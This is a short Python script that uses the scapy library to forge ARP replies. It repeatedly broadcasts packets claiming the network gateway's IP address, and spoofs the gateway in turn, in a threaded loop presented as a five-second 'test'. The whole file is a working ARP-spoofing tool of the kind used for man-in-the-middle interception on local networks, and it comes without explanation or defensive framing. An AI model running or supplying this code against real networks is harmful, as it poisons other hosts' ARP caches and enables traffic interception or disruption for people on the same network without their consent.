import scapy.all as scapy
import time
import sys
import constants
import threading


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def broadcast_spoof(excute: threading.Lock):
    sent_packets_count = 0

    target_ip = constants.broadcast_ip
    spoof_ip = constants.GATEWAY_IP
    while True:
        if excute.acquire(timeout=0.1):
            spoof(target_ip, spoof_ip)
            spoof(spoof_ip, target_ip)
            sent_packets_count += 2
            print("\r[*] Packets Sent: " + str(sent_packets_count), end="")
            sys.stdout.flush()
            time.sleep(0.0001)
            excute.release()
        else:
            print("oopsi poopsi")
            break


def main():
    print("Running test...")

    # Create a lock object for threading
    lock = threading.Lock()
    # Create a thread for the broadcast_spoof function
    spoof_thread = threading.Thread(target=broadcast_spoof, args=(lock,))

    # Call the function with test parameters
    spoof_thread.start()
    time.sleep(5)
    lock.acquire(blocking=True)

    print("\nTest completed.")

if __name__ == "__main__":
    main()


